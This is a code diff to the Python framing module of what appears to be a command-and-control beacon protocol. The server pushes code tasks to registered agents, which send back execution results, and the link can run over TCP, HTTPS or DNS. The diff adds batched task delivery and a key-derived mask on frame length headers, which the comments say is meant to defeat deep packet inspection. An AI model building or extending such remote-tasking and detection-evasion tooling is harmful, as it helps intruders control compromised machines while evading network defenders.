@@ -16,6 +16,7 @@ recv_frame: 读取长度头 → 读取载荷 → 解码数据
 
 import struct
 import socket
+import hashlib
 from typing import Callable, Optional
 
 from .crypto import encode_frame, decode_frame
@@ -24,20 +25,22 @@ FRAME_HEADER_SIZE = 4
 MAX_FRAME_SIZE = 512 * 1024  # 512 KB
 
 # ── 协议版本 ──
-PROTOCOL_VERSION = 1
+PROTOCOL_VERSION = 2   # v2: 批量任务模型(TASKS/FETCH/batch 标记);版本不匹配直接拒绝,不做向下兼容
 
 # ── 消息类型 (7.3) ──
-REGISTER = "register"   # → Server：注册即握手（version/role/id/via）
+REGISTER = "register"   # → Server：注册即握手（version/role/id/via/batch）
 WELCOME = "welcome"     # Server →：握手成功 + 服务端 banner
-TASK = "task"           # Server →：下发代码（task_id/code）
-RESULT = "result"       # → Server：执行结果（task_id/output/error）
+TASK = "task"           # Server →：下发单条代码（task_id/code）[legacy 保留类型,新流程不主动使用]
+TASKS = "tasks"         # Server →：批量下发任务数组 + 结果确认回执（tasks/acked）
+RESULT = "result"       # → Server：单条执行结果（task_id/output/error）
+FETCH = "fetch"         # → Server：声明结果已全部上报,请求下发任务
 PONG = "pong"           # Server →：无任务，结束本周期
 COMMAND = "command"     # Client 通道：命令文本
 RESPONSE = "response"   # Client 通道：命令输出
 ERROR = "error"         # 双向：错误消息（code/message），发送后关闭连接
 
 MESSAGE_TYPES = (
-    REGISTER, WELCOME, TASK, RESULT, PONG, COMMAND, RESPONSE, ERROR,
+    REGISTER, WELCOME, TASK, TASKS, RESULT, FETCH, PONG, COMMAND, RESPONSE, ERROR,
 )
 
 # ── 错误码 (10.4) ──
@@ -88,6 +91,9 @@ def validate_message(msg) -> Optional[str]:
             return BAD_JSON
         if "shell" in msg and not isinstance(msg["shell"], bool):
             return BAD_JSON
+        # v2: batch 标记必须为 bool（缺省 False；beacon 端口强校验见会话层）
+        if "batch" in msg and not isinstance(msg["batch"], bool):
+            return BAD_JSON
     elif mtype == RESULT:
         if not isinstance(msg.get("task_id"), str):
             return BAD_JSON
@@ -100,13 +106,25 @@ def validate_message(msg) -> Optional[str]:
         if not isinstance(msg.get("task_id"), str) or \
                 not isinstance(msg.get("code"), str):
             return BAD_JSON
+    elif mtype == TASKS:
+        # 批量任务帧: tasks 必须是数组且元素含 str task_id + str code;acked 必须是数组
+        tasks = msg.get("tasks")
+        if not isinstance(tasks, list):
+            return BAD_JSON
+        for t in tasks:
+            if (not isinstance(t, dict)
+                    or not isinstance(t.get("task_id"), str)
+                    or not isinstance(t.get("code"), str)):
+                return BAD_JSON
+        if not isinstance(msg.get("acked", []), list):
+            return BAD_JSON
     elif mtype == COMMAND:
         if not isinstance(msg.get("line"), str):
             return BAD_JSON
     elif mtype == ERROR:
         if not isinstance(msg.get("code"), str):
             return BAD_JSON
-    # WELCOME / PONG / RESPONSE 无必填约束
+    # WELCOME / PONG / FETCH / RESPONSE 无必填约束
     return None
 
 
@@ -138,18 +156,22 @@ def _recv_exactly(sock: socket.socket, n: int, read_fn: Callable = None) -> byte
     return bytes(buf)
 
 
+def frame_mask(key: bytes) -> int:
+    """长度头掩码（固定值,由主密钥派生）。
+
+    混淆目标: 长度头不再明文显示真实帧长(防 DPI 直接读长度分布)。
+    固定掩码保证无状态通道(HTTPS/DNS,每次请求独立无 seq)与 TCP 一致;
+    实际长度分布已由帧尾 padding(0-255)打乱,掩码后再无固定值可聚类。
+    """
+    return int.from_bytes(
+        hashlib.sha256(key + b"len").digest()[:4], "big")
+
+
 def send_frame(sock: socket.socket, data: bytes, key: bytes,
                write_fn: Callable = None) -> None:
-    """发送一帧: 编码 → 写入 [长度头 | 载荷]。
-
-    Args:
-        sock: socket 对象
-        data: 原始字节
-        key: XOR 密钥
-        write_fn: 可选的写入函数 (测试用)
-    """
+    """发送一帧: 编码 → 写入 [掩码长度头 | 载荷]。"""
     encoded = encode_frame(data, key)
-    header = struct.pack(">I", len(encoded))
+    header = struct.pack(">I", len(encoded) ^ frame_mask(key))
     sendall = write_fn if write_fn else sock.sendall
     sendall(header + encoded)
 
@@ -174,9 +196,11 @@ def recv_frame(sock: socket.socket, key: bytes,
     recv = read_fn if read_fn else sock.recv
 
     header = _recv_exactly(sock, FRAME_HEADER_SIZE, recv)
-    payload_len = struct.unpack(">I", header)[0]
+    payload_len = struct.unpack(">I", header)[0] ^ frame_mask(key)
 
-    if max_frame_size > 0 and payload_len > max_frame_size:
+    # 帧尾 padding(≤255B) + pad_len(1B) 余量: 真实载荷上限仍是
+    # max_frame_size,含 padding 的线上帧上限为 max_frame_size + 256
+    if max_frame_size > 0 and payload_len > max_frame_size + 256:
         raise ValueError(
             f"recv_frame: frame size {payload_len} exceeds "
             f"maximum {max_frame_size}"
